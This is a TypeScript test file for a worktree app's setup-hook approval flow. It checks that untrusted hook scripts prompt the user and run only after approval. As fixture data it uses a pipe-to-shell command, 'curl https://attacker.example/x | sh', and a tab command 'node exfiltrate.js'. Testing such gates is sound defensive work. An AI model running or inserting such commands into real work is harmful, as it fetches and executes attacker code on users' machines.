import { beforeEach, describe, expect, it, vi } from 'vitest'
import { getDefaultSettings } from '../../../../shared/constants'
import { hashOrcaHookScriptContent } from '../../../../shared/orca-hook-trust'
import { __resetTrustPromptChainForTests } from '@/lib/ensure-hooks-confirmed'
import { makeWorktree } from './worktrees-slice-test-fixtures'
import {
  createTestStore,
  mockApi,
  resetRemoteRuntimeMocks,
  resetWorktreeSliceModuleMemory
} from './worktrees-slice-test-harness'

vi.mock('sonner', () => ({
  toast: { warning: vi.fn(), info: vi.fn(), success: vi.fn(), error: vi.fn(), dismiss: vi.fn() }
}))

const WORKTREE_CONTENT = 'curl https://attacker.example/x | sh'
const runner = { runnerScriptPath: '/path/feature/.git/orca/setup-runner.sh', envVars: {} }
const tabs = [{ title: 'Server', command: 'node exfiltrate.js' }]

function arrange(decision: 'run' | 'skip') {
  const store = createTestStore()
  const openModal = vi.fn((_kind: string, data?: Record<string, unknown>) => {
    const onResolve = data?.onResolve
    if (typeof onResolve === 'function') {
      onResolve(decision)
    }
  })
  store.setState({
    settings: getDefaultSettings('/tmp'),
    repos: [],
    worktreesByRepo: { repo1: [] },
    openModal,
    trustedOrcaHooks: {
      repo1: { setup: { contentHash: hashOrcaHookScriptContent('pnpm install'), approvedAt: 1 } }
    }
  })
  mockApi.worktrees.create.mockResolvedValue({
    worktree: makeWorktree({ id: 'repo1::/path/feature', repoId: 'repo1', path: '/path/feature' }),
    defaultTabs: { tabs, runCommands: false },
    setupApproval: {
      scriptContent: WORKTREE_CONTENT,
      contentHash: hashOrcaHookScriptContent(WORKTREE_CONTENT),
      setup: runner,
      runDefaultTabCommands: true
    }
  })
  return { store, openModal }
}

beforeEach(() => {
  vi.clearAllMocks()
  resetRemoteRuntimeMocks()
  resetWorktreeSliceModuleMemory()
  __resetTrustPromptChainForTests()
})

describe('createWorktree setup approval', () => {
  it('sends the setup trust this client holds', async () => {
    const { store } = arrange('skip')

    await store.getState().createWorktree('repo1', 'feature')

    expect(mockApi.worktrees.create).toHaveBeenCalledWith(
      expect.objectContaining({
        setupTrust: { contentHash: hashOrcaHookScriptContent('pnpm install') }
      })
    )
  })

  it('prompts with the worktree content and launches setup once approved', async () => {
    const { store, openModal } = arrange('run')

    const result = await store.getState().createWorktree('repo1', 'feature')

    expect(openModal).toHaveBeenCalledWith(
      'confirm-orca-yaml-hooks',
      expect.objectContaining({
        repoId: 'repo1',
        scriptKind: 'setup',
        scriptContent: WORKTREE_CONTENT,
        contentHash: hashOrcaHookScriptContent(WORKTREE_CONTENT),
        previouslyApproved: true
      })
    )
    expect(result.setup).toEqual(runner)
    expect(result.defaultTabs).toEqual({ tabs, runCommands: true })
    expect(result.setupApproval).toBeUndefined()
  })

  it('leaves setup and tab commands off when the user declines', async () => {
    const { store } = arrange('skip')

    const result = await store.getState().createWorktree('repo1', 'feature')

    expect(result.setup).toBeUndefined()
    expect(result.defaultTabs).toEqual({ tabs, runCommands: false })
    expect(result.setupApproval).toBeUndefined()
  })
})
